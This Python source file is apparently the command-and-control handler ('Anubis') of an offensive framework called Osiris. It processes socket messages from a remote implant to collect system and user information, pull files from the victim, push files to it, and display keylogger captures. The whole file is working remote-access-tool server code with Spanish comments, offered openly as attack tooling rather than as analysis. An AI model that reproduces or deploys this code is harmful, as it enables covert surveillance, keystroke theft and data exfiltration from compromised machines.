#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337
import os
import socket
import struct
from tabulate import tabulate
from utilities.Colors import color
from utilities.Tools import tools
from utilities.Messages import print_message

print_message.name_module = __file__


class Anubis:
    def __init__(self):
        self.__sysinfo_result = None
        self.__data = None
        self.__anubis_command_permitted = ['download', 'upload', 'sysinfo', 'recv_download_file', 'size_download_file',
                                           'error', 'keylogger_read']
        self.__socked_fd = None
        self.__tmp_folder = tools.temp_dir()['message'] + "/osiris-download/"

    def processor(self, socket_fd: socket.socket, information: dict):
        self.__socked_fd = socket_fd
        try:
            for __key, __value in information.items():
                if __key in self.__anubis_command_permitted:
                    if __key == 'sysinfo':
                        self._print_sysinfo(__value)
                        break
                    elif __key == 'download':
                        self._download_file(__value)
                        break
                    elif __key == 'upload':
                        self._upload_file(__value)
                        break
                    elif __key == 'size_download_file':
                        self._receive_file_size(__value)
                    elif __key == 'recv_download_file':
                        self._recv_download_file(__value)
                    elif __key == 'keylogger_read':
                        self._keylogger_read(__value)
                    elif __key == 'error':
                        print_message.execution_error(__value)
                    else:
                        pass
        except KeyError:
            pass

    def _print_sysinfo(self, sysinfo: list):
        self.__sysinfo_result = [
            [color.color('yellow', 'System'), color.color('yellow', 'Processor'), color.color('yellow', 'Node'),
             color.color('yellow', 'Machine'),
             color.color('yellow', 'version'), color.color('yellow', 'Release'), color.color('yellow', 'Username')]]

        self.__sysinfo_result.append(
            [color.color("lgray", sysinfo[0]), color.color("lgray", sysinfo[1]), color.color("lgray", sysinfo[2]),
             color.color("lgray", sysinfo[3]), color.color("lgray", sysinfo[4]), color.color("lgray", sysinfo[5]),
             color.color("cyan", sysinfo[6])])

        if len(self.__sysinfo_result) > 1:
            print(tabulate(self.__sysinfo_result, headers='firstrow', tablefmt='simple', stralign='left'))
            print('')

    def _receive_file_size(self, __packet):
        # Esta función se asegura de que se reciban los bytes
        # que indican el tamaño del archivo que será enviado,
        # que es codificado por el cliente vía struct.pack(),
        # función la cual genera una secuencia de bytes que
        # representan el tamaño del archivo.
        self.__fmt = "<Q"
        self.__expected_bytes = struct.calcsize(self.__fmt)
        self.__received_bytes = 0
        self.__stream = bytes()
        while self.__received_bytes < self.__expected_bytes:
            self.__chunk = bytes.fromhex(__packet)
            self.__stream += self.__chunk
            self.__received_bytes += len(self.__chunk)
        self.__filesize = struct.unpack(self.__fmt, self.__stream)[0]

        return self.__filesize

    def _download_file(self, __filename):
        self.__tmp_folder_created = tools.create_dir(self.__tmp_folder)
        self.__file_name = __filename.split("/")[-1] if '/' in __filename else __filename.split("\\")[-1]

        if self.__tmp_folder_created['code'] == 200:
            self.__tmp_file = self.__tmp_folder_created['message'] + self.__file_name

        self.__socked_fd.send("procedure_download ".encode() + __filename.encode())

    def _recv_download_file(self, __packet):
        self.__received_bytes = 0
        with open(self.__tmp_file, "wb") as f:
            # Recibir los datos del archivo en bloques de
            # 1024 bytes hasta llegar a la cantidad de
            # bytes total informada por el cliente.
            while self.__received_bytes < self.__filesize:
                chunk = self.__socked_fd.recv(8192)
                print(color.color("yellow", "[!] ") + color.color("lgray", "receiving ") + color.color("cyan", str(
                    self.__received_bytes)) + color.color("green", " bytes") + color.color("lgray",
                                                                                           " blocksize ") + color.color(
                    "cyan", str(len(chunk))) + color.color("green", " bytes"))
                if chunk:
                    f.write(chunk)
                    self.__received_bytes += len(chunk)

            # f.close()
        print(color.color("green", "[+] ") + color.color("yellow", "Name: ") + color.color("green",
                                                                                           self.__file_name) + color.color(
            "yellow", " filesize: ") + color.color("green", self.__filesize) + color.color("green",
                                                                                           " bytes") + color.color(
            "yellow", " path: ") + color.color("green", self.__tmp_file))

    def _upload_file(self, __filename):
        print(__filename)
        self.__count_bytes = 0
        # Obtener el tamaño del archivo a enviar.
        try:
            self.__filesize = os.path.getsize("".join(__filename[0][0:]))
        except FileNotFoundError:
            print_message.execution_error("File {} could not be found".format("".join(__filename[0][0:])))
            return
        print_message.execution_info("loading file : {}".format("".join(__filename[0][0:])))
        # Informar primero al servidor la cantidad
        # de bytes que serán enviados.

        self.__socked_fd.sendall(struct.pack("<Q", self.__filesize))
        # Enviar el archivo en bloques de 1024 bytes.

        with open("".join(__filename[0][0:]), "rb") as f:
            while read_bytes := f.read(8192):
                self.__count_bytes += len(read_bytes)
                print(color.color("yellow", "[!] ") + color.color("lgray", "Loading ") + color.color("cyan", str(
                    self.__count_bytes)) + color.color("green", " bytes") + color.color("lgray",
                                                                                        " blocksize ") + color.color(
                    "cyan", str(len(read_bytes))) + color.color("green", " bytes"))

                self.__socked_fd.sendall(read_bytes)
        print(color.color("green", "[+] ") + color.color("lgray", "Full load ") + color.color("green",
                                                                                              str(self.__filesize) + str(
                                                                                                  " bytes")) + color.color(
            "lgray", " of ") + color.color("yellow", __filename[1]))

    def _keylogger_read(self, __data):
        print_message.execution_info(__data)


anubis = Anubis()